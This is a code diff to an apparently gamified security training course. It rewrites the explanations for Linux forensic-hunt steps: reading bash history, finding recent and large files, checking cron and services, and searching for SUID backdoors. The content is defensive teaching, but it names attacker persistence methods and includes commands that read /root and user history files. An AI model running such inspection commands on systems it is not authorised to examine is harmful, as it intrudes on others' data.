       title: "Bash History Audit",
-      why: "Check user history.",
+      why: "Forensic Hunt: Read the compromised user's history file. Careless attackers often leave a perfect textual record of the exact commands they executed.",
       text: "Type <code>cat ~/.bash_history</code>",
       objective: "cat .bash_history",
       xp: 15,
@@ -728,7 +728,7 @@ const module9_technical = {
     },
     {
       title: "Grep History IP",
-      why: "Look for IP addresses.",
+      why: "Forensic Hunt: Filter the history log for the attacker's IP to prove lateral movement or C2 interaction.",
       text: 'Type <code>grep "10.0.0.99" ~/.bash_history</code>',
       objective: "Grep IP from history",
       xp: 30,
@@ -736,7 +736,7 @@ const module9_technical = {
     },
     {
       title: "Count History",
-      why: "Check size.",
+      why: "Forensic Hunt: A suspiciously small history file (e.g., 0 lines) is a massive Indicator of Compromise, proving the attacker deliberately wiped their tracks.",
       text: "Type <code>wc -l ~/.bash_history</code>",
       objective: "wc -l .bash_history",
       xp: 15,
@@ -744,7 +744,7 @@ const module9_technical = {
     },
     {
       title: "Find Large Files",
-      why: "Find malware footprints.",
+      why: "Forensic Hunt: Use the <b>-size</b> flag to scan the entire hard drive for unusually massive files. This is how you discover packaged data exfiltration archives (like loot.tar.gz).",
       text: "Type <code>find / -size +10M</code>",
       objective: "Find > 10MB",
       xp: 30,
@@ -752,7 +752,7 @@ const module9_technical = {
     },
     {
       title: "Find Recent Files",
-      why: "Locate newly dropped files.",
+      why: "Forensic Hunt: Time-bounding the search space. The <b>-mmin -60</b> flag lists every single file on the operating system that was modified within the last 60 minutes.",
       text: "Type <code>find / -mmin -60</code>",
       objective: "Find files modified 60m",
       xp: 30,
@@ -760,7 +760,7 @@ const module9_technical = {
     },
     {
       title: "Check Root Directory",
-      why: "List root contents.",
+      why: "Forensic Hunt: Thoroughly list the admin folder. Attackers often hide rootkits or secondary SSH keys in hidden dotfiles here.",
       text: "Type <code>ls -la /root</code>",
       objective: "ls -la /root",
       xp: 15,
@@ -768,7 +768,7 @@ const module9_technical = {
     },
     {
       title: "Check Home Dir",
-      why: "List home contents.",
+      why: "Forensic Hunt: Audit the standard user directories to identify staging areas or downloaded privilege escalation scripts (like LinPEAS).",
       text: "Type <code>ls -la /home</code>",
       objective: "ls -la /home",
       xp: 15,
@@ -776,7 +776,7 @@ const module9_technical = {
     },
     {
       title: "Audit Cronjob Files",
-      why: "Read system cron files.",
+      why: "Forensic Hunt: Read the global scheduling file. If a reverse shell script is listed here, the system is fundamentally compromised upon reboot.",
       text: "Type <code>cat /etc/crontab</code>",
       objective: "cat /etc/crontab",
       xp: 20,
@@ -784,7 +784,7 @@ const module9_technical = {
     },
     {
       title: "Search SUID Malware",
-      why: "Scan for malicious SUID files.",
+      why: "Forensic Hunt: Scan the filesystem for hidden, root-owned executables containing the word 'backdoor', identifying persistent SUID privilege escalation vectors.",
       text: 'Type <code>find / -perm -4000 -name "*backdoor*"</code>',
       objective: "Find backdoor",
       xp: 35,
@@ -793,7 +793,7 @@ const module9_technical = {
     },
     {
       title: "Audit Services",
-      why: "List running services.",
+      why: "Forensic Hunt: Query the systemd architect for a list of all currently active background daemons to catch malicious services posing as legitimate processes.",
       text: "Type <code>systemctl list-units --type=service --state=running</code>",
       objective: "List running services",
       xp: 25,
@@ -801,7 +801,7 @@ const module9_technical = {
     },
     {
       title: "Check Logs Count",
-      why: "Audit syslog lines.",
+      why: "Forensic Hunt: Evaluate the structural data density of the diagnostic logs to confirm the attacker did not execute a destructive null-truncation command.",
       text: "Type <code>wc -l /var/log/syslog</code>",
       objective: "wc -l syslog",
       xp: 15,
@@ -810,7 +810,7 @@ const module9_technical = {
     },
     {
       title: "System Final Stats",
-      why: "Final disk and mem.",
+      why: "The environment is secure. Validate that memory usage and disk availability have returned to their mathematical baselines.",
       text: "Type <code>df -h && free -m</code>",
       objective: "Type df and free",
       xp: 20,
@@ -818,7 +818,7 @@ const module9_technical = {
     },
     {
       title: "Final Sign-Off",
-      why: "Close report.",
+      why: "You have mapped the network, exploited the web application, escalated privileges, hardened the firewall, and audited the kernel. You are a true Senior Security Engineer.",
       text: 'Type <code>echo "Security Audit Complete" > final_audit.txt</code>',
       objective: "Type echo",
       xp: 25,
